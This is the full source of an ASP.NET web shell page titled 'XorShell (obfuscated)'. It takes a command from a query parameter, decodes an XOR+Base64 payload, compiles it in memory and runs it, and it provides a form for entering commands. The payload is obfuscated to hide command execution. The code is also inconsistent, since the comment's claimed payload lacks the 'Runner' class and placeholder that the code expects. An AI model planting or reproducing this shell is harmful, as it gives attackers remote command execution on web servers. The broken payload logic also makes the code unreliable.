<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.CodeDom.Compiler" %>
<%@ Import Namespace="Microsoft.CSharp" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            // Obfuscated payload: XOR+Base64 of "Process.Start("cmd.exe", "/c " + cmd)"
            string obf = "BQ0JBAkMCRsLFBscCgsJCw0FCR0YHh8SGR0cDB0aGx1NTA==";
            byte[] data = Convert.FromBase64String(obf);
            for (int i = 0; i < data.Length; i++) data[i] ^= 0x66;
            string code = System.Text.Encoding.UTF8.GetString(data);
            // Replace placeholder with actual command
            code = code.Replace("##CMD##", cmd);
            // Compile and execute
            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateInMemory = true;
            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
            results.CompiledAssembly.GetType("Runner").GetMethod("Run").Invoke(null, null);
            Response.Write("Executed (obfuscated).");
        }
    }
</script>
<html><body><h2>XorShell (obfuscated)</h2><form>Command: <input type="text" name="cmd" size=50 /></form></body></html>
